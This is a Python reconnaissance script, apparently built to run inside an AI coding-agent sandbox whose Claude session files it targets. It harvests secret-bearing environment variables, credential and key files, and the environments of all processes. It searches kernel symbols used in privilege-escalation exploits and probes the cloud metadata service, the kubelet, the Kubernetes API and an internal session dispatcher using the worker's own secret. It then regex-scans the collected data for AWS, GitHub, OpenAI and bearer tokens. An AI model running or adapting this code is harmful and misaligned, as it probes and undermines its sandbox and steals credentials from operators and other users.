#!/usr/bin/env python3
import base64, hashlib, json, os, pathlib, re, socket, ssl, stat, subprocess, time, urllib.request, urllib.error

OUT = {
    "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "identity": {},
    "env": {},
    "files": [],
    "claude": {},
    "proc": [],
    "mounts": [],
    "sockets": {},
    "network": {},
    "http": {},
    "commands": {},
}

def read_bytes(path, limit=65536):
    try:
        return pathlib.Path(path).read_bytes()[:limit]
    except Exception as e:
        return {"error": repr(e)}

def read_text(path, limit=65536):
    b = read_bytes(path, limit)
    if isinstance(b, dict):
        return b
    return b.decode("utf-8", "replace")

def rec(path):
    try:
        s = os.lstat(path)
        typ = "link" if stat.S_ISLNK(s.st_mode) else "dir" if stat.S_ISDIR(s.st_mode) else "file" if stat.S_ISREG(s.st_mode) else "other"
        r = {"path": path, "mode": oct(stat.S_IMODE(s.st_mode)), "uid": s.st_uid, "gid": s.st_gid, "size": s.st_size, "type": typ}
        if typ == "link":
            try: r["target"] = os.readlink(path)
            except Exception: pass
        return r
    except Exception as e:
        return {"path": path, "error": repr(e)}

def cmd(name, args, timeout=15, input_data=None):
    try:
        p = subprocess.run(args, input=input_data, capture_output=True, text=True, timeout=timeout)
        OUT["commands"][name] = {"rc": p.returncode, "stdout": p.stdout[:30000], "stderr": p.stderr[:10000]}
    except Exception as e:
        OUT["commands"][name] = {"error": repr(e)}

def http(name, url, headers=None, data=None, method="GET", timeout=8):
    try:
        req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout, context=ssl._create_unverified_context()) as r:
            b = r.read(100000)
            OUT["http"][name] = {"status": r.status, "headers": dict(r.headers), "bytes": len(b), "body": b.decode("utf-8", "replace")[:50000]}
    except Exception as e:
        OUT["http"][name] = {"error": repr(e)}

for p in ["/proc/self/status", "/proc/1/status", "/proc/self/uid_map", "/proc/self/gid_map", "/proc/self/cgroup", "/proc/net/route", "/etc/hostname", "/etc/hosts", "/etc/resolv.conf", "/proc/sys/kernel/core_pattern", "/proc/sys/kernel/modprobe", "/proc/sys/kernel/kptr_restrict", "/proc/sys/kernel/dmesg_restrict"]:
    OUT["identity"][p] = read_text(p, 100000)

for k, v in sorted(os.environ.items()):
    if re.search(r"(KUBE|AWS|TOKEN|SECRET|SERVICE|PROXY|BUILDMODE|SNAPGPT|PYGEN|DOCKER|CONTAINER|CLAUDE)", k, re.I):
        OUT["env"][k] = v

# Read likely credential/config locations, including hidden files.
roots = ["/home/worker", "/tmp", "/run", "/var/run", "/etc", "/app", "/opt", "/var/lib", "/workspace"]
pat = re.compile(r"(token|secret|credential|kube|service.?account|aws|irsa|docker|containerd|claude|session|passwd|shadow|id_rsa|id_ed25519|\.pem$|\.key$|\.json$|\.conf$|\.env$)", re.I)
seen = set()
for root in roots:
    if not os.path.exists(root):
        continue
    for dp, dns, fns in os.walk(root, followlinks=False):
        # Avoid enormous dependency trees; still inspect /app source and all home/tmp files.
        depth = dp[len(root):].count(os.sep)
        if depth > 7:
            dns[:] = []
            continue
        if root == "/app" and any(x in dp for x in ["/.venv", "/node_modules"]):
            dns[:] = []
            continue
        for fn in fns:
            p = os.path.join(dp, fn)
            if p in seen:
                continue
            seen.add(p)
            if not (pat.search(fn) or pat.search(dp)):
                continue
            r = rec(p)
            if r.get("type") == "file" and r.get("size", 0) <= 131072:
                b = read_bytes(p, 131072)
                if not isinstance(b, dict):
                    r["sha256"] = hashlib.sha256(b).hexdigest()
                    r["text"] = b.decode("utf-8", "replace")
            OUT["files"].append(r)
            if len(OUT["files"]) >= 800:
                break
        if len(OUT["files"]) >= 800:
            break
    if len(OUT["files"]) >= 800:
        break

# Claude session state and task files, explicitly.
for base in ["/home/worker/.claude", "/tmp/claude-1000", "/tmp/cc-socks"]:
    OUT["claude"][base] = {"exists": os.path.exists(base), "entries": []}
    if not os.path.isdir(base):
        continue
    for dp, dns, fns in os.walk(base):
        if dp[len(base):].count(os.sep) > 5:
            dns[:] = []
            continue
        for fn in fns:
            p = os.path.join(dp, fn)
            r = rec(p)
            if r.get("type") == "file" and r.get("size", 0) <= 131072:
                r["text"] = read_text(p, 131072)
            OUT["claude"][base]["entries"].append(r)

# Process inventory, including all visible processes and their environment/fds.
for pid in sorted([x for x in os.listdir("/proc") if x.isdigit()], key=int):
    if int(pid) > 30000:
        continue
    r = {"pid": pid}
    for name in ["cmdline", "environ", "status", "cgroup"]:
        try:
            b = pathlib.Path("/proc/" + pid + "/" + name).read_bytes()
            if name in ("cmdline", "environ"):
                b = b.replace(b"\0", b" ")
            r[name] = b.decode("utf-8", "replace")[:50000]
        except Exception as e:
            r[name] = {"error": repr(e)}
    for name in ["cwd", "root", "exe"]:
        try: r[name] = os.readlink("/proc/" + pid + "/" + name)
        except Exception as e: r[name] = {"error": repr(e)}
    try:
        r["fds"] = [(x, os.readlink("/proc/" + pid + "/fd/" + x)) for x in sorted(os.listdir("/proc/" + pid + "/fd"))]
    except Exception as e:
        r["fds"] = {"error": repr(e)}
    OUT["proc"].append(r)

for p in ["/proc/self/mountinfo", "/proc/1/mountinfo", "/proc/self/mounts", "/proc/1/mounts", "/proc/net/unix", "/proc/net/tcp", "/proc/net/tcp6"]:
    OUT["mounts"].append({"path": p, "text": read_text(p, 200000)})

# Commands that expose kernel/container surfaces.
for name, args, timeout in [
    ("id", ["id"], 10),
    ("uname", ["uname", "-a"], 10),
    ("route", ["sh", "-c", "ip route 2>&1 || cat /proc/net/route"], 10),
    ("caps", ["sh", "-c", "capsh --print 2>&1 || grep -E '^(Cap|NoNewPrivs|Seccomp)' /proc/self/status"], 10),
    ("devices", ["sh", "-c", "ls -la /dev; cat /proc/partitions"], 10),
    ("cgroup", ["sh", "-c", "find /sys/fs/cgroup -maxdepth 3 -type f -name '*release*' -o -name 'notify_on_release' -o -name 'cgroup.procs' | head -100"], 10),
    ("kallsyms", ["sh", "-c", "grep -E ' (nft_do_chain|nft_immediate_eval|commit_creds|prepare_kernel_cred|init_cred|modprobe_path|core_pattern|__init_begin|__init_end)$' /proc/kallsyms"], 10),
    ("modules", ["sh", "-c", "cat /proc/modules | head -80"], 10),
    ("dmesg", ["sh", "-c", "dmesg | tail -80"], 15),
    ("aws_cli", ["sh", "-c", "command -v aws || true; aws sts get-caller-identity 2>&1 || true"], 20),
    ("kube_cli", ["sh", "-c", "command -v kubectl || true; kubectl version --request-timeout=3s 2>&1 || true"], 20),
]:
    cmd(name, args, timeout)

# Direct AWS and Kubernetes probes.
for name, url in [
    ("sts", "https://sts.us-east-1.amazonaws.com/"),
    ("s3", "https://s3.us-east-1.amazonaws.com/"),
    ("kube_api", "https://172.20.0.1:443/version"),
    ("kube_api_dns", "https://kubernetes.default.svc/version"),
    ("kubelet", "https://172.20.0.1:10250/pods"),
    ("imds", "http://169.254.169.254/latest/meta-data/"),
    ("dispatcher_health", "http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/health"),
    ("dispatcher_sessions_x", "http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/sessions"),
    ("dispatcher_openapi", "http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/openapi.json"),
]:
    http(name, url, headers={"X-SL-Token": "x"} if name == "dispatcher_sessions_x" else {}, timeout=8)

# Test state endpoint with the worker's own secret.
sid = os.environ.get("BUILDMODE_SESSION_ID", "")
sec = os.environ.get("BUILDMODE_STATE_SECRET", "")
if sid and sec:
    base = "http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local"
    http("state_self", base + "/session/" + sid + "/state", headers={"X-State-Secret": sec}, timeout=20)
    http("state_self_resume", base + "/session/" + sid + "/state?resume_from=" + sid, headers={"X-State-Secret": sec}, timeout=20)
    http("sessions_state", base + "/sessions", headers={"X-SL-Token": sec}, timeout=10)

# UNIX socket inventory and nonblocking connection probes.
for p in ["/tmp/cc-socks", "/run", "/var/run"]:
    if not os.path.isdir(p):
        continue
    for dp, dns, fns in os.walk(p):
        for fn in fns:
            path = os.path.join(dp, fn)
            try:
                st = os.lstat(path)
                if stat.S_ISSOCK(st.st_mode):
                    OUT["sockets"][path] = {"mode": oct(stat.S_IMODE(st.st_mode)), "uid": st.st_uid, "gid": st.st_gid}
            except Exception:
                pass

# Credential regex over small text files, excluding noisy package trees.
regexes = {
    "aws_access_key": r"\b(?:AKIA|ASIA)[A-Z0-9]{16}\b",
    "private_key": r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----",
    "jwt": r"\beyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b",
    "sl_token": r"\bSLToken\s+[A-Za-z0-9+/=_-]{20,}",
    "github": r"\b(?:ghp|gho|ghu|ghs)_[A-Za-z0-9]{20,}\b",
    "slack": r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b",
    "openai": r"\bsk-[A-Za-z0-9_-]{20,}\b",
    "bearer": r"(?i)\bBearer\s+[A-Za-z0-9._~+/=-]{20,}",
}
OUT["secret_regex_hits"] = []
for r in OUT["files"]:
    text = r.get("text")
    if not isinstance(text, str):
        continue
    for kind, patt in regexes.items():
        for m in re.finditer(patt, text):
            OUT["secret_regex_hits"].append({"path": r.get("path"), "kind": kind, "value": m.group(0)[:500]})
            if len(OUT["secret_regex_hits"]) >= 300:
                break
        if len(OUT["secret_regex_hits"]) >= 300:
            break
    if len(OUT["secret_regex_hits"]) >= 300:
        break

print(json.dumps(OUT, sort_keys=True, separators=(",", ":")))
